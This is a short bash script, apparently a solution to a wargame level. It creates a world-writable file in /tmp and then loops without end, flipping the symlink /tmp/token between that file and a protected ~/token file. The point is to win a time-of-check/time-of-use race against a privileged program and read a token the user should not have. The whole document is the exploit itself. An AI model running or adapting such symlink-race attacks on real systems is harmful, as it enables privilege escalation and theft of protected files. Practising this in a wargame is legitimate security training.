#!/bin/bash

echo "" > /tmp/level10
chmod 777 /tmp/level10

while true
do
    ln -sf /tmp/level10 /tmp/token;
    ln -sf ~/token /tmp/token;
done